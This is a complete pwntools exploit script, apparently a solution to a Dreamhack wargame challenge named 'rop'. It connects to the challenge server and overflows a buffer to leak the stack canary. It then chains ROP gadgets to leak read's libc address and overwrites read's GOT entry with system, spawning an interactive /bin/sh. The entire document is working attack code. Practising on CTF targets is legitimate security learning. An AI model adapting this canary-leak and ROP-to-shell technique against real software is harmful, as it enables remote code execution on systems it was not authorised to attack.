from pwn import *

def log(a, b):
    return success(": ".join([a, hex(b)]))

p = remote("host3.dreamhack.games", 18380)
e = ELF("./rop")
libc = ELF("./libc-2.27.so")

#leak canary
canary_payload = b'A' * 0x39
p.sendafter("Buf: ", canary_payload)
p.recvuntil(canary_payload)
canary = p.recvn(7)
canary = u64(b'\x00' + canary)
log("Canary", canary)

#Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']

pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A" * 0x38 + p64(canary) + b"B" * 0x8

#puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

#read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

#system(/bin/sh)
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)

read = u64(p.recvn(6) + b"\x00" * 2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

log("read", read)
log("lib base", lb)
log("system", system)

p.send(p64(system) + b"/bin/sh\x00")
p.interactive()
